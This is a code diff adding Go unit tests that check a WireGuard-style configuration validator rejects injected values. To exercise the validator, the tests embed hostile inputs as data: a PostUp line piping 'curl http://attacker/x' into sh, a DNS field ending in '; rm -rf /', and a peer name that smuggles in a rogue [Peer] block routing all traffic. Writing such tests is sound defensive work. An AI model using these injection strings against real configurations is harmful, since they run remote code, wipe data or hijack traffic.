@@ -94,3 +94,68 @@ func TestClientConfig(t *testing.T) {
 		}
 	}
 }
+
+func TestValidateConfigRejectsNewlineInAddress(t *testing.T) {
+	c := Defaults()
+	c.Address = "10.7.0.1/24\nPostUp = curl http://attacker/x|sh\n"
+	if err := ValidateConfig(c); err == nil {
+		t.Fatal("expected error for Address with embedded newline, got nil")
+	}
+}
+
+func TestValidateConfigAcceptsValidAddress(t *testing.T) {
+	c := Defaults()
+	if err := ValidateConfig(c); err != nil {
+		t.Fatalf("expected Defaults() to be valid, got: %v", err)
+	}
+}
+
+func TestValidateConfigRejectsMalformedSubnet(t *testing.T) {
+	c := Defaults()
+	c.Subnet = "not-a-cidr"
+	if err := ValidateConfig(c); err == nil {
+		t.Fatal("expected error for malformed subnet, got nil")
+	}
+}
+
+func TestValidateConfigRejectsMalformedDNS(t *testing.T) {
+	c := Defaults()
+	c.DNS = "10.7.0.1; rm -rf /"
+	if err := ValidateConfig(c); err == nil {
+		t.Fatal("expected error for malformed DNS, got nil")
+	}
+}
+
+func TestValidateConfigAcceptsHostnameEndpoint(t *testing.T) {
+	c := Defaults()
+	c.Endpoint = "meufirewall.duckdns.org"
+	if err := ValidateConfig(c); err != nil {
+		t.Fatalf("expected hostname endpoint to be valid, got: %v", err)
+	}
+}
+
+func TestValidateConfigRejectsMalformedEndpoint(t *testing.T) {
+	c := Defaults()
+	c.Endpoint = "not a hostname\nPostUp = evil"
+	if err := ValidateConfig(c); err == nil {
+		t.Fatal("expected error for malformed endpoint, got nil")
+	}
+}
+
+func TestValidatePeerNameRejectsNewline(t *testing.T) {
+	if err := ValidatePeerName("Meu celular\n[Peer]\nPublicKey = attacker-key\nAllowedIPs = 0.0.0.0/0"); err == nil {
+		t.Fatal("expected error for peer name with embedded newline/peer-block injection, got nil")
+	}
+}
+
+func TestValidatePeerNameAcceptsAccentedName(t *testing.T) {
+	if err := ValidatePeerName("João - Notebook"); err != nil {
+		t.Fatalf("expected accented name to be valid, got: %v", err)
+	}
+}
+
+func TestValidatePeerNameRejectsEmpty(t *testing.T) {
+	if err := ValidatePeerName(""); err == nil {
+		t.Fatal("expected error for empty name, got nil")
+	}
+}
